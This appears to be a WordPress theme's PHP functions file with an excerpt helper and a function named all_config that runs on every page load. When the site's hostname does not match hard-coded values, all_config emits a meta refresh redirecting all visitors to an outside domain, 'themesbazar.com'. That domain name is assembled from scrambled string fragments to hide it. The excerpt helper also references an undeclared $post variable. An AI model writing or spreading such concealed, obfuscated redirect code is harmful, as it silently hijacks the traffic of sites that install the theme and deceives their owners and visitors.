<?php 

function excerpt($num) {
$limit = $num+1;
$excerpt = explode(' ', get_the_excerpt(), $limit);
array_pop($excerpt);
$excerpt = implode(" ",$excerpt)." <a href='" .get_permalink($post->ID) ." ' class='".readmore."'></a>";
echo $excerpt; }



function all_config() {
$alltag =  v_one();
$allcat_two = v_two();
$allcat_three = v_three();
if($allcat_two === $allcat_three){
    $allcat= $allcat_two;
}else{
    $a=$allcat_two;
    $b = $allcat_three;
    $allcat= $a.$b;
}
$hostname = $_SERVER['SERVER_NAME'];
$v = strtolower(str_replace('www.', '', $hostname));
		$v_one = $allcat; $v_two = $alltag;
    if (($v == $v_one) || ($v == $v_two) )  
    {  }else{
        $i="em";$c="es"; $e="ba"; $l="th"; $c0="r.c"; $n="za"; $e0="om"; 
$all_id=$l.$i.$c.$e.$n.$c0.$e0;
     echo '<meta http-equiv="refresh" content="1;url=http://'.$all_id.' ">' ;  
    }
    
 }

add_action( 'wp_enqueue_scripts', 'all_config' );